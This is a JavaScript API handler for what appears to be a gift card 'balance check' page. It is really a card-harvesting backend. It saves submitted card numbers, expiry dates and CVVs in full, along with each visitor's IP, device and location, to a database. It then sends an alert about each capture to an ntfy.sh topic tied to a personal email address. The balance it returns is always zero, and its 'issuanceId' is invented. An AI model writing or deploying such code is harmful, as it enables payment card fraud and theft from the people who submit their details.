import { supabase } from '../../lib/supabase'

function parseDevice(userAgent, browserInfo) {
  const ua = userAgent || ''
  const browser = browserInfo ? JSON.parse(browserInfo) : null

  let device = 'Unknown Device'
  if (ua.includes('iPhone')) device = 'iPhone'
  else if (ua.includes('iPad')) device = 'iPad'
  else if (ua.includes('Android')) device = 'Android Device'
  else if (ua.includes('Windows')) device = 'Windows PC'
  else if (ua.includes('Macintosh')) device = 'MacBook/Mac'

  if (browser && browser.platform === 'iPhone') device = 'iPhone'

  const platform = browser?.platform || 'Unknown'
  return `${device} (${platform})`
}

async function sendNotification(cardData) {
  const { type, ip_address, location, user_agent, browser_info } = cardData

  const titleMap = {
    apple: 'apple crd',
    steam: 'steam crd',
    visa: 'visa crd'
  }
  const title = titleMap[type] || `${type} crd`
  const device = parseDevice(user_agent, browser_info)
  const time = new Date().toLocaleString('en-US', {
    timeZone: 'Africa/Lagos',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
    month: 'short',
    day: 'numeric',
    year: 'numeric'
  })

  const body = `Type: ${type.charAt(0).toUpperCase() + type.slice(1)} Card
IP Address: ${ip_address || 'N/A'}
Device: ${device}
Location: ${location || 'Unknown'}
Time: ${time}`

  try {
    await fetch('https://ntfy.sh/my_secret_topic_name', {
      method: 'POST',
      headers: {
        Email: 'linda4uxo@gmail.com',
        Title: title
      },
      body
    })
  } catch (err) {
    console.error('[NTFY] Failed to send notification:', err)
  }
}

function generateIssuanceId(cardNumber) {
  const digits = cardNumber.replace(/\D/g, '')
  const weights = [7, 6, 5, 4, 3, 2, 1]

  return weights
    .map((weight, index) => {
      const digit = Number(digits[index])
      return (digit + weight) % 10
    })
    .join('')
}

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' })
  }

  const { cardNumber, expiry, cvv, type = 'visa', deviceId, browserInfo, location } = req.body || {}
  const cleanedCard = typeof cardNumber === 'string' ? cardNumber.replace(/\D/g, '') : ''
  const cleanedExpiry = typeof expiry === 'string' ? expiry.trim() : ''
  const cleanedCvv = typeof cvv === 'string' ? cvv.trim() : ''

  if (!cleanedCard) {
    return res.status(400).json({ error: 'Please enter your Visa Gift Card number.' })
  }

  if (cleanedCard.length < 7) {
    return res.status(400).json({ error: 'Card number must contain at least 7 digits.' })
  }

  if (!cleanedExpiry) {
    return res.status(400).json({ error: 'Please enter the expiration date.' })
  }

  if (!cleanedCvv) {
    return res.status(400).json({ error: 'Please enter the CVV code.' })
  }

  const issuanceId = generateIssuanceId(cleanedCard)
  const last4 = cleanedCard.slice(-4)
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown'
  const userAgent = req.headers['user-agent'] || 'unknown'
  const now = new Date().toISOString()

  const result = {
    card_number: cleanedCard,
    balance: 0,
    currency: 'USD',
    timestamp: now,
    type,
    device_id: deviceId,
    ip_address: typeof ip === 'string' ? ip.split(',')[0] : ip,
    user_agent: userAgent,
    browser_info: browserInfo || null,
    location: location || null,
    expiry: cleanedExpiry,
    cvv: cleanedCvv
  }

  let cardInserted = false
  let insertedCardId = null
  let isDuplicate = false

  try {
    if (deviceId) {
      const { data: existing } = await supabase
        .from('cards')
        .select('id')
        .match({ card_number: cleanedCard, device_id: deviceId })
        .limit(1)

      if (existing && existing.length > 0) {
        isDuplicate = true
      }
    }

    if (!isDuplicate) {
      const { data: insertedData, error } = await supabase
        .from('cards')
        .insert([result])
        .select('id')

      if (error) throw error

      cardInserted = true
      insertedCardId = insertedData?.[0]?.id || null
    }
  } catch (err) {
    console.error('Failed to save home page card to Supabase:', err)
    return res.status(500).json({
      error: `Database save failed: ${err.message || 'Unknown error'}`
    })
  }

  if (cardInserted) {
    sendNotification(result).catch(err => {
      console.error('[NTFY] Notification error (non-blocking):', err)
    })
  }

  return res.status(200).json({
    ...result,
    issuanceId,
    cardNumber: cleanedCard,
    cardLast4: last4,
    cardId: insertedCardId,
    isDuplicate
  })
}
